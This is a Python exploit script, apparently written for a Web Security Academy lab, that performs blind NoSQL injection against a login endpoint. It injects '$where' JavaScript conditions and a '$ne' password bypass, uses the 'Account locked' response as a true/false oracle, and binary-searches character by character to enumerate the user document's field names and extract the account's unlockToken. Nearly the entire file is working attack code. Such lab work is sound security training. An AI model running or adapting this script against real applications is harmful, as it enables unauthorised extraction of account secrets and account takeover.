import requests

burp0_url = "https://0a98000b041de59d84c8f1df00b500f3.web-security-academy.net:443/login"
burp0_cookies = {"session": "mBzE9mdHgAxbEyIFgiFp650jvAUf8OIi"}
burp0_headers = {"Sec-Ch-Ua": "\"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"", "Sec-Ch-Ua-Platform": "\"Linux\"", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36", "Content-Type": "application/json", "Accept": "*/*", "Origin": "https://0a98000b041de59d84c8f1df00b500f3.web-security-academy.net", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://0a98000b041de59d84c8f1df00b500f3.web-security-academy.net/login", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", "Priority": "u=1, i"}
burp0_json={"$where": "Object.keys(this)[0][0]<'~'", "password": {"$ne": ""}, "username": "carlos"}

def letter_in_field_less_than_letter(key_index: int, letter_index: int, letter: str):
    data  = burp0_json.copy()
    data["$where"] = f"Object.keys(this)[{key_index}][{letter_index}]<'{letter}'"
    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=data)
    if "Account locked" in r.text:
        return True
    return False

def letter_in_field_equal_letter(key_index: int, letter_index: int, letter: str):
    data  = burp0_json.copy()
    data["$where"] = f"Object.keys(this)[{key_index}][{letter_index}]=='{letter}'"
    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=data)
    if "Account locked" in r.text:
        return True
    return False


def get_object_field_name_letter(key_index: int, letter_index: int):
    begin = 33  # '!' char
    end = 126  # `~` char
    while begin < end - 1:
        mid = (begin + end) // 2
        print(f"[*] Trying letter {chr(mid)}")
        if letter_in_field_less_than_letter(key_index, letter_index, chr(mid)):
            end = mid
        else:
            begin = mid
    
    print(f"[*] Trying letter {chr(begin)}")
    if letter_in_field_equal_letter(key_index, letter_index, chr(begin)):
        return chr(begin)

    print(f"[*] Trying letter {chr(end)}")
    if letter_in_field_equal_letter(key_index, letter_index, chr(end)):
        return chr(end)

    return None

def get_object_field_name(index: int):
    name = ""
    for i in range(100):
        if letter := get_object_field_name_letter(index, i):
            print(f"[?] Current name found: {name+letter}")
            name += letter
        else:
            print(f"[!] Found name: {name}")
            return name


def get_all_field_names():
    index = 0
    field_names = []
    while name := get_object_field_name(index):
        field_names.append(name)
        print(f"[!] Field names found: {field_names}")
        index += 1
    return field_names


def letter_in_field_value_less_than_letter(field_name: str, index: int, letter: str):
    data  = burp0_json.copy()
    data["$where"] = f"this.{field_name}[{index}]<'{letter}'"
    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=data)
    if "Account locked" in r.text:
        return True
    return False


def letter_in_field_value_equal_letter(field_name: str, index: int, letter: str):
    data  = burp0_json.copy()
    data["$where"] = f"this.{field_name}[{index}]=='{letter}'"
    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=data)
    if "Account locked" in r.text:
        return True
    return False


def get_field_value_letter(name: str, index: int):
    begin = 33  # '!' char
    end = 126  # `~` char
    while begin < end - 1:
        mid = (begin + end) // 2
        print(f"[*] Trying letter {chr(mid)}")
        if letter_in_field_value_less_than_letter(name, index, chr(mid)):
            end = mid
        else:
            begin = mid
    
    print(f"[*] Trying letter {chr(begin)}")
    if letter_in_field_value_equal_letter(name, index, chr(begin)):
        return chr(begin)

    print(f"[*] Trying letter {chr(end)}")
    if letter_in_field_value_equal_letter(name, index, chr(end)):
        return chr(end)

    return None

def get_field_value(name: str):
    value = ""
    for i in range(100):
        if letter := get_field_value_letter(name, i):
            print(f"[?] Current value found: {value+letter}")
            value += letter
        else:
            print(f"[!] Found value: {value}")
            return value





# print(get_all_field_names())  # ['_id', 'username', 'password', 'unlockToken']
print(get_field_value("unlockToken"))  # 9106453dcbaa2d9b